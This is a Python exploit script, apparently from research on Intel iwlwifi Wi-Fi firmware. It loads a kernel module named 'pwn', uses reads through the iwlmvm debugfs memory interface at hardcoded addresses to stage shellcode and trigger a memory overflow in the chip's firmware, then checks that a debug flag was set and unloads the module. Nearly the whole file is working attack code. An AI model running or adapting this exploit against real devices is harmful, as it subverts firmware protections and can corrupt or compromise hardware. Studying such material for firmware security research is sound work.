#!/usr/bin/env python3

"""
This scripts interacts with the kernel module "pwn.ko" to enable debug
functions.
"""

import os
from pathlib import Path
import subprocess

DEBUGFS_IWLMVM = next(Path("/sys/kernel/debug/iwlwifi").glob("*/iwlmvm"))
MEM_PATH = str(DEBUGFS_IWLMVM / "mem")

def trigger(addr):
    """Interact with the kernel module with a read at a specific address."""

    fd = os.open(MEM_PATH, os.O_RDONLY | os.O_SYNC)
    os.lseek(fd, addr, 0)
    try:
        os.read(fd, 32)
    except OSError as e:
        if e.errno != os.errno.ENXIO:
            raise
    os.close(fd)

def read_mem(addr, size=128):
    fd = os.open(MEM_PATH, os.O_RDONLY | os.O_SYNC)
    os.lseek(fd, addr, 0)
    data = b""
    for i in range(0, 1 + size // 32):
        chunk = os.read(fd, 32)
        data += chunk

    os.close(fd)

    return data[:size]

def insmod(modname="pwn", insert=True):
    loaded = os.path.exists("/sys/module/pwn/")
    if insert:
        if loaded:
            print(f"[*] module {modname} already loaded")
        else:
            print(f"[*] loading module {modname}")
            directory = Path(__file__).parent.absolute()
            module_path = os.path.join(directory, f"../hook-driver/{modname}.ko")
            subprocess.run(["insmod", module_path])
    else:
        if not loaded:
            print(f"[*] module {modname} isn't loaded")
        else:
            print(f"[*] unloading module {modname}")
            subprocess.run(["rmmod", modname])

def is_debug_enabled():
    DEBUG_FLAG    = 0xC0A03088
    flag = int.from_bytes(read_mem(DEBUG_FLAG, 4), "little")
    return flag & 0x400

def pwn():
    TRIGGER_ADDR  = 0xc0a03108
    TRIGGER_ADDR2 = 0xc0a03208
    TARGET_PC     = 0x0100EB88

    print("[*] putting shellcode in memory")
    trigger(TRIGGER_ADDR2)

    print("[*] ensuring shellcode is there")
    data = read_mem(TARGET_PC, 16)
    print(f"    {data.hex()}")

    print("[*] triggering overflow")
    trigger(TRIGGER_ADDR)

    print("[*] ensuring debug flag is set")

    if is_debug_enabled():
        print("    SUCCESS!")
    else:
        print(f"    FAILURE")

def enable_debug():
    if is_debug_enabled():
        print("[*] debug flag already set")
        return

    insmod(insert=True)
    pwn()
    insmod(insert=False)

if __name__ == "__main__":
    enable_debug()
